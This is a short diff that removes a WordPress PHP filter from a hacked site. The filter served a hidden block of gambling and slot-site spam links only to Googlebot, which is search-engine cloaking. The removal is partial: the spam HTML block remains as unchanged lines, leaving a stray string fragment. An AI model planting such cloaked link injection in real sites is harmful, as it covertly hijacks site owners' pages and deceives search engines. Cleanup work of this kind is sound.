@@ -1,6 +1,3 @@
-function bfa_append_to_post($post_body_content) {
-if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']),"googlebot")){
-$post_body_content = $post_body_content . 
 '<div class="sitez">
 <h1>Our Partners:</h1>
 <p>1. VIVA99 merupakan salah satu Situs <a href="https://www.charlestonchronicle.net/">Slot Online</a> Terpercaya di Asia yang banyak memberikan bonus</p>
@@ -11,7 +8,3 @@ $post_body_content = $post_body_content .
 <p>5. Brazelberries is a trusted Online <a href="https://www.brazelberries.com/" target="_blank">Gambling News</a> in The World</p>
 <p>6. thethaoFB9 Trang <a href="https://www.fcbanat.com/" target="_blank">C&aacute; Cược B&oacute;ng Đ&aacute;</a> Uy T&iacute;n Số 1 Việt Nam</p>
 </div>';
-return $post_body_content;
-  }
-}
-add_filter('the_content', 'bfa_append_to_post');
